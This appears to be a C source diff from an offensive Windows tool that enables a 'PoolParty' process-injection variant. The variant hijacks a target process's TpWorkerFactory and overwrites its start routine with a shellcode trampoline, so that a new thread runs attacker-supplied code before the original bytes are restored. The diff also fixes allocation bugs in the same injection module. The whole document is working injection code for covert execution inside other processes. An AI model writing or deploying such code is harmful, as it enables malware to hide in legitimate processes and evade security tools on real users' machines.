@@ -15,7 +15,7 @@ NtDll* GetOrInitNtDll() {
 			break;
 		}
 
-		pNtDll = (NtDll*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(pNtDll));
+		pNtDll = (NtDll*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(NtDll));
 		if(!pNtDll) {
 			break;
 		}
@@ -46,6 +46,19 @@ NtDll* GetOrInitNtDll() {
 			}
 		}
 		dprintf("[INJECT][inject_via_poolparty][ntdll_init] ZwSetIoCompletion: %p", pNtDll->pZwSetIoCompletion);
+
+		pNtDll->pNtQueryInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, WORKERFACTORYINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationWorkerFactory");
+		pNtDll->pNtSetInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, WORKERFACTORYINFOCLASS, PVOID, ULONG))GetProcAddress(hNtDll, "NtSetInformationWorkerFactory");
+
+		if (pNtDll->pNtQueryInformationWorkerFactory == NULL || pNtDll->pNtSetInformationWorkerFactory == NULL) {
+			bError = TRUE;
+			break;
+		}
+
+		dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtQueryInformationWorkerFactory = %p && NtSetInformationWorkerFactory = %p", pNtDll->pNtQueryInformationWorkerFactory, pNtDll->pNtSetInformationWorkerFactory);
+		if (poolLifeguard != NULL) {
+			poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isSystemSupported = TRUE;
+		}
 
 		//ntdll->pZwAssociateWaitCompletionPacket = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR, PBOOLEAN))GetProcAddress(hNtDll, "ZwAssociateWaitCompletionPacket");
 		//if (ntdll->pZwAssociateWaitCompletionPacket != NULL) {
@@ -105,9 +118,12 @@ POOLPARTY_INJECTOR* GetOrInitPoolParty(DWORD dwSourceArch, DWORD dwDestinationAr
 			}
 			poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isInjectionSupported = poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isSystemSupported;
 		}
+		if ((dwSourceArch == PROCESS_ARCH_X64 && dwDestinationArch == PROCESS_ARCH_X64) || (dwSourceArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X86)) {
+			poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isInjectionSupported = poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isSystemSupported;
+		}
 		poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].handler = remote_tp_direct_insertion;
 		// poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].handler = remote_tp_wait_insertion;
-		// poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].handler = worker_factory_start_routine_overwrite;
+		poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].handler = worker_factory_start_routine_overwrite;
 		poolLifeguard->init = TRUE;
 
 	}while(0);
@@ -129,7 +145,7 @@ BOOL supports_poolparty_injection(DWORD dwSourceArch, DWORD dwDestinationArch) {
 		dprintf("[INJECT][supports_poolparty_injection] dwSourceArch: %d dwDestinationArch: %d", dwSourceArch, dwDestinationArch);
 		dprintf("[INJECT][supports_poolparty_injection] os.dwMajorVersion: %d os.dwMinorVersion: %d", os.dwMajorVersion, os.dwMinorVersion);
 		if (os.dwMajorVersion >= 10) {
-			if (dwDestinationArch == PROCESS_ARCH_X64 && (dwSourceArch == PROCESS_ARCH_X64 || dwSourceArch == PROCESS_ARCH_X86)) {
+			if ((dwDestinationArch == PROCESS_ARCH_X64 && (dwSourceArch == PROCESS_ARCH_X64 || dwSourceArch == PROCESS_ARCH_X86)) || (dwDestinationArch == PROCESS_ARCH_X86 && dwSourceArch == PROCESS_ARCH_X86)) {
 				return TRUE;
 			}
 		}
@@ -153,7 +169,7 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 	}
 	lpProcessInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
 	if(lpProcessInfo == NULL) {
-		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapAlloc() returned NULL");
+		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapAlloc() for lpProcessInfo returned NULL");
 		return INVALID_HANDLE_VALUE;
 	}
 	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p", lpProcessInfo);
@@ -163,7 +179,7 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 		if (ntStatus == STATUS_INFO_LENGTH_MISMATCH && dwInformationSizeIn != dwInformationSizeOut) {
 			lpProcessInfo = HeapReAlloc(hHeap, 0, lpProcessInfo, dwInformationSizeOut);
 			if(lpProcessInfo == NULL) {
-				dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc() returned NULL");
+				dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc() for lpProcessInfo returned NULL");
 				return INVALID_HANDLE_VALUE;
 			}
 			dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc lpProcessInfo: %p", lpProcessInfo);
@@ -179,6 +195,10 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 	dwInformationSizeIn = 2048;
 	dwInformationSizeOut = 0;
 	lpObjectInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
+	if (lpObjectInfo == NULL) {
+		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapAlloc for lpObjectInfo returned NULL");
+		return INVALID_HANDLE_VALUE;
+	}
 	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpObjectInfo: %p", lpObjectInfo);
 	for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
 		if (DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
@@ -187,6 +207,16 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 				if (lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer) == 0) {
 					break;
 				}
+			}
+			else if (dwInformationSizeOut > dwInformationSizeIn) {
+				lpObjectInfo = HeapReAlloc(hHeap, 0, lpObjectInfo, dwInformationSizeOut);
+				if (lpObjectInfo == NULL) {
+					dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc for lpObjectInfo returned NULL");
+					return INVALID_HANDLE_VALUE;
+				}
+				dwInformationSizeIn = dwInformationSizeOut;
+				pNtDll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut); // get the whole context this time...
+				if (!lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer)) { break; }
 			}
 			CloseHandle(hHijackHandle);
 		}
@@ -250,6 +280,83 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 	return dwResult;
 }
 
+DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerEvent) {
+        DWORD dwResult = ERROR_INVALID_FUNCTION;
+        unsigned char trampoline_poolparty[] = { 0xeb, 0x03, 0x58, 0xff, 0x10, 0xe8, 0xf8, 0xff, 0xff, 0xff };
+        DWORD dwStubSize = sizeof(trampoline_poolparty) + sizeof(LPVOID);
+        WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryBasicInfo = { 0 };
+        HANDLE hHeap = GetProcessHeap();
+        unsigned char* lpStub = NULL;
+        unsigned char* lpOriginalBytes = NULL;
+
+        do {
+                GetOrInitNtDll();
+                if (pNtDll == NULL) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] GetOrInitNtDll failed.", ERROR_INVALID_FUNCTION);
+                }
+                if (!poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isSystemSupported) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] This variant isn't supported on the current system.", ERROR_NOT_SUPPORTED);
+                }
+                if (hHeap == NULL) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Can't obtain process heap.", ERROR_NOT_SUPPORTED);
+                }
+                lpStub = (unsigned char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwStubSize);
+                if (lpStub == NULL) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Can't allocate shellcode.", ERROR_NOT_SUPPORTED);
+                }
+                HANDLE hDuplicatedHandle = GetRemoteHandle(hProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
+                if (hDuplicatedHandle == INVALID_HANDLE_VALUE) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Couldn't find TpWorkerFactory object in the target process or couldn't duplicate the found TpWorkerFactory object", ERROR_NOT_SUPPORTED);
+                }
+                ULONG ReturnLength = 0;
+                dwResult = pNtDll->pNtQueryInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryBasicInformation,&WorkerFactoryBasicInfo,sizeof(WORKER_FACTORY_BASIC_INFORMATION),&ReturnLength);
+                dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtQueryInformationWorkerFactory returned 0x%x && ReturnLength = %lu", dwResult, ReturnLength);
+                if (dwResult != STATUS_SUCCESS || ReturnLength > sizeof(WORKER_FACTORY_BASIC_INFORMATION) || WorkerFactoryBasicInfo.StartRoutine == NULL) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtQueryInformationWorkerFactory failed.",ERROR_NOT_SUPPORTED);
+                }
+                if (lpStub == NULL) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] shellcode is NULL", ERROR_NOT_SUPPORTED);
+                }
+                uintptr_t StubAddress = (uintptr_t)lpStartAddress;
+                memcpy(lpStub, &trampoline_poolparty, sizeof(trampoline_poolparty));
+                memcpy(lpStub + 10, &StubAddress, sizeof(StubAddress));
+                lpOriginalBytes = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwStubSize);
+                if (lpOriginalBytes == NULL) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] OriginalBytes is NULL", ERROR_NOT_SUPPORTED);
+                }
+                if (!ReadProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpOriginalBytes, dwStubSize, NULL)) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ReadProcessMemory failed.", ERROR_NOT_SUPPORTED);
+                }
+                SIZE_T szWritten = 0;
+                if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpStub, dwStubSize, &szWritten) || szWritten != dwStubSize) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't write stub to WorkerFactory's start routine.", ERROR_NOT_SUPPORTED);
+                }
+                WorkerFactoryBasicInfo.ThreadMinimum++; //Increase minimum thread number to create a new thread.
+                dwResult = pNtDll->pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryThreadMinimum, &WorkerFactoryBasicInfo.ThreadMinimum, sizeof(ULONG));
+                dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory returned 0x%x",dwResult);
+                if (dwResult != STATUS_SUCCESS) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory failed.", ERROR_NOT_SUPPORTED);
+                }
+                Sleep(1000);
+                if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpOriginalBytes, dwStubSize, &szWritten) || szWritten != dwStubSize) {
+                        BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't restore the original bytes.", ERROR_NOT_SUPPORTED);
+                }
+                WorkerFactoryBasicInfo.ThreadMinimum--;
+                dwResult = pNtDll->pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryThreadMinimum, &WorkerFactoryBasicInfo.ThreadMinimum, sizeof(ULONG));
+                if (dwResult != STATUS_SUCCESS) {
+                        dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory for restoring ThreadMinimum returned 0x%x", dwResult);
+                        dwResult = STATUS_SUCCESS; // Resetting the status to success.
+                }
+        } while (0);
+        if (hHeap != NULL && lpStub != NULL) {
+                HeapFree(hHeap, 0, lpStub);
+        }
+        if (hHeap != NULL && lpOriginalBytes != NULL) {
+                HeapFree(hHeap, 0, lpOriginalBytes);
+        }
+        return dwResult;
+}
+
 //DWORD remote_tp_wait_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerHandle) {
 //	BOOL bError = FALSE;
 //	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
@@ -288,39 +395,3 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 //	} while (0);
 //	return dwResult;
 //}
-
-//DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerEvent) {
-//	BOOL bError = FALSE;
-//	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
-//	ULONG dwInformationSizeIn = 1;
-//	ULONG dwInformationSizeOut = 0;
-//	pNtDll* ntDll = NULL;
-//	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
-//	HANDLE hHeap = GetProcessHeap();
-//	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
-//	do {
-//		ntDll = GetOrInitNtDll();
-//		if (ntdll == NULL) {
-//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Cannot GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
-//		}
-//		if (poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isInjectionSupported) {
-//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
-//		}
-//		hHijackHandle = GetRemoteHandle(hProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
-//
-//		if (hHijackHandle == INVALID_HANDLE_VALUE) {
-//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
-//		}
-//
-//		if (hHijackHandle != INVALID_HANDLE_VALUE) {
-//			ntdll->pNtQueryInformationWorkerFactory(hHijackHandle, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
-//
-//			ULONG WorkerFactoryMinimumThreadNumber = WorkerFactoryInformation.TotalWorkerCount + 1;
-//			dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WorkerFactoryInformation.StartRoutine: %ull", WorkerFactoryInformation.StartRoutine);
-//			ntdll->pNtSetInformationWorkerFactory(hHijackHandle, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
-//		}
-//	} while (0);
-//	return dwResult;
-//}
-//
-
